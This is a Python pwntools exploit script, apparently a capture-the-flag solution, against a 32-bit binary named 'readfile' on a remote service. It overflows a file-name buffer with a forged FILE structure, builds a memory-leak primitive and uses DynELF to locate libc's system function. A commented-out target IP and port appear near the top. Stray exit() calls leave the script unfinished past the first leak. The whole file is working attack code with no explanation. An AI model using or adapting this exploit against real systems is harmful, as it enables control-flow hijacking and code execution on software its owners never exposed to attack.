from pwn import *

HOST, PORT = '0.0.0.0', 8000
# HOST, PORT = '118.70.80.143', 23504

def socket():
	return remote(HOST, PORT)

fp = 0x804a0a0 + 0x20
main = 0x8048911

file_payload = p32(0) + p32(0) * 0xf + p32(0xffffffff) + p32(0)
file_payload = file_payload.ljust(0x40)
file_payload += p32(0x804a090) + p32(0x804890f) + p32(fp+0x40+4) * 50
def trigger(payload, r2=None):
	r = socket()
	r.sendline('1')
	r.sendline('/tmp/jinmo123_file')
	r.sendline(str(len(payload) + 1))
	r.sendline(payload)
	r.recvall()

	if r2 is None:
		r = socket()
	else:
		r = r2
	r.sendline('2')
	r.sendline('/tmp/jinmo123_file'.ljust(0x20, '\x00') + file_payload)
	r.recvuntil('file name: ')
	return r

r = None
def leak(addr):
	global r
	payload = 'A' * 0x100 + p32(0) + p32(fp) + 'A' * 8 + p32(0) + p32(0x80485b0) + p32(main) + p32(addr)
	r = trigger(payload, r)
	print `r.recvall()`
	exit()
	data = r.recvuntil('#####', drop=True)[:-1].split('A' * 0x100)[1][1:] + '\x00'
	print hex(addr), `data`

	return data

elf = ELF('/media/sf_j/Downloads/readfile')
leak(0x8048000)
exit()
dynelf = DynELF(leak, 0x8048000, elf=elf)

system = dynelf.lookup('system', 'libc')
print hex(system)